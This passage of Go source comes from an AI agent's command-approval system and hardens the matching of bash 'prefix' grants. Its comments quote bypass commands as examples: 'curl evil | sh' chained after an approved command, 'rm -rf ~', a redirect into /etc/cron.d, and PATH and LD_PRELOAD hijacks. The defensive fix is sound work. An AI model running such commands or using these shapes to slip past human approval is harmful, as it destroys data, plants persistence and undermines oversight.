// not a SINGLE segment (review finding #1 — see below), the segment is not
// "simple" (finding #1/#2), or the command's head cannot be confidently
// resolved without normalisation (finding #2) — the caller MUST treat that
// as "no prefix grant can apply," never as a match.
//
// # Review findings #1 and #2 (2026-09-23 security fix lane)
//
// Before this fix, this function resolved the head of the WHOLE raw command
// string via shellCommandHeadDetailed and then tokenised the WHOLE command
// for argument words — with no chain-operator splitting at all. A prefix
// grant recorded for "git status" therefore matched "git status && curl
// evil | sh" (the trailing words after "status" were never inspected
// beyond a simple ArgPrefix "starts-with" comparison, which by definition
// never notices what comes AFTER the matched prefix), "git status \nrm -rf
// ~" (same shape via a newline), and "git status > /etc/cron.d/x" (a
// redirection riding along as more "argument words"). It also discarded
// shellCommandHeadDetailed's third return (normalised), so "./git status"
// (a directory-stripped head) and "PATH=/tmp/evil git status"/
// "LD_PRELOAD=/tmp/evil.so git status" (a silently-skipped env-assignment
// prefix — the REAL, correctly-resolved git still runs, just under an
// attacker-controlled environment) all matched too.
//
// The fix: require EXACTLY one D3 segment (splitShellSegments — the same
// splitter D3's own EvaluateCommand uses, so the two can't drift, per the
// finding's own instruction), require shellrule.IsSimpleSegment on that one
// segment (closes the redirection/substitution/subshell/env-assignment
// shapes in one gate, shared with FullyAllowed's identical fix), and
// require an UN-normalised head (closes the look-alike/case-fold/directory-
// strip shape) before ever resolving or tokenising anything.
func bashPrefixMatchInputs(args map[string]any) (resolvedBinary string, argWords []string, runInBackground bool, ok bool) {
	command, _ := args["command"].(string)
	if command == "" {
		return "", nil, false, false
	}
	runInBackground = getBoolArg(args, "run_in_background")

	segments := splitShellSegments(command)
	if len(segments) != 1 {
		// A prefix grant is a single-segment concept — BashPrefixGrantFor
		// never derives one for a chained command (its own len(segments)!=1
		// check). The CHECK side must refuse the identical shape: without
		// this, a grant for "git status" would settle "git status && curl
		// evil | sh" because the old code only ever inspected the FIRST
		// segment's head, never noticed a second command chained after it.
		return "", nil, runInBackground, false
	}
	seg := segments[0]

	if !shellRuleSimpleSegment(seg) {
		// Redirection, command/process substitution, a subshell/grouping,
		// or a leading env-assignment prefix — none of these may ever be
		// silently settled by a prefix grant, even when a resolvable head
		// still sits at the front of the segment.
		return "", nil, runInBackground, false
	}

	head, fromExpansion, normalised := shellCommandHeadDetailed(seg)
	if fromExpansion || normalised || head == "" {
		// A normalised head (case-folded, directory-prefix stripped —
		// "./git", "GIT") must never satisfy a grant recorded against the
		// real, resolved binary; that is exactly the look-alike shape
		// FR-040 exists to refuse.
		return "", nil, runInBackground, false
	}
	path := os.Getenv("PATH")
	resolved, err := shellrule.ResolveBinary(head, path)
	if err != nil {
		return "", nil, runInBackground, false
	}
	words, tokOK := tokenizeShellWords(seg)
	if !tokOK {
		return "", nil, runInBackground, false
	}
	_, args2 := resolveShellHead(words)
	return resolved, args2, runInBackground, true
}

// shellRuleSimpleSegment applies shellrule.IsSimpleSegment using this
// package's own shellRuleOptions() platform selection, so the D4
// prefix-grant check and the D3 FullyAllowed fast path share one
// definition of "simple" (review finding #1's own instruction: "use the
// same segment splitter everywhere so the sites can't drift").
func shellRuleSimpleSegment(seg string) bool {
	return shellrule.IsSimpleSegment(seg, shellRuleOptions().Platform)
}

// BashPrefixGrantCheck is the seam CheckGrantOrRequestApproval's own
// bash-specific extension (pkg/agent/loop_policy.go) calls — kept here, and
// exported, so pkg/agent never needs its own copy of D3's resolve-and-verify
// logic. Returns false whenever grants is nil (the store's own
// nil-receiver safety already guarantees this, but the explicit check keeps
// this function's contract self-evident without relying on a reader already
// knowing that fact about *security.ApprovalGrantStore).
func BashPrefixGrantCheck(grants *security.ApprovalGrantStore, sessionID, agentID, toolName string, args map[string]any) bool {
	if grants == nil {
		return false
	}
	resolvedBinary, argWords, runInBackground, ok := bashPrefixMatchInputs(args)
	if !ok {
		return false
	}
	return grants.IsPrefixAllowed(sessionID, agentID, toolName, resolvedBinary, argWords, runInBackground)
}

// prefixGrantWrappers are the ADR-092 D4 wrapper heads (FR-026). A prefix
// derived from one of them is the wrapper alone (or "sh -c"), which would
// approve every later command run through that wrapper — so no prefix
// grant is offered for them; the approval is recorded as exact instead.
var prefixGrantWrappers = map[string]bool{"sudo": true, "env": true, "timeout": true, "xargs": true, "sh": true}

// BashPrefixGrantFor derives the D4 "prefix" scope grant for a bash call a
// human approved with scope=prefix, from the approval's own recorded args
// (never from client input). It uses the same resolution
// BashPrefixGrantCheck matches against (resolved head binary, argument
// words, run_in_background) and FR-026's suggested prefix for the argument
// part, so a recorded grant is exactly what the check side will find.
//
// ok is false — the caller records an exact grant instead, the safe
// direction — when no narrower-than-the-program prefix exists:
//   - the command has more than one segment (`a && b`, `a | b`): the
//     argument words of a single prefix would span into the next
//     segment's command;
//   - Windows (FR-041: exact-command grants only), an unresolvable head,
//     or a blind spot;
//   - the prefix is the bare program (`ls`) or a wrapper (`sudo …`,
//     `sh -c …`), which would approve every later use of it.
func BashPrefixGrantFor(args map[string]any) (security.ShellPrefixGrant, bool) {
	command, _ := args["command"].(string)
	if command == "" || len(splitShellSegments(command)) != 1 {
		return security.ShellPrefixGrant{}, false
	}
	resolved, _, runInBackground, ok := bashPrefixMatchInputs(args)
	if !ok {
		return security.ShellPrefixGrant{}, false
	}
	opts := shellRuleOptions()
	prefix, ok := shellrule.SuggestedPrefix(command, opts.Platform, opts.HeadResolver)
	if !ok {
		return security.ShellPrefixGrant{}, false
	}
	words := strings.Fields(prefix)
	if len(words) < 2 || prefixGrantWrappers[words[0]] {
		return security.ShellPrefixGrant{}, false
	}
	return security.ShellPrefixGrant{
		Binary:          resolved,
		ArgPrefix:       strings.Join(words[1:], " "),
		RunInBackground: runInBackground,
	}, true
}
